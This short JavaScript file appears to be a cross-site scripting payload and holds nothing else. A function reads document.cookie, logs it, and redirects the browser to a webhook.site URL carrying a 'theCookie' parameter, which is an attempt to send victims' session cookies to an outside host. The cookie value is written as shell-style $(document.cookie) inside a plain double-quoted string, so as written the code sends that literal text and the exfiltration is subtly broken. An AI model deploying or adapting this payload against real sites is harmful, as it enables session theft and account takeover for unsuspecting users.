function xssPayload() {
  const alertMsg = 'xss ' + document.cookie;
  console.log(alertMsg);
  window.location.replace("https://webhook.site/9f56f27e-407b-4645-bdd1-173484f6f8ad?theCookie=$(document.cookie)");
}

console.log('XSS payload executed');
xssPayload();
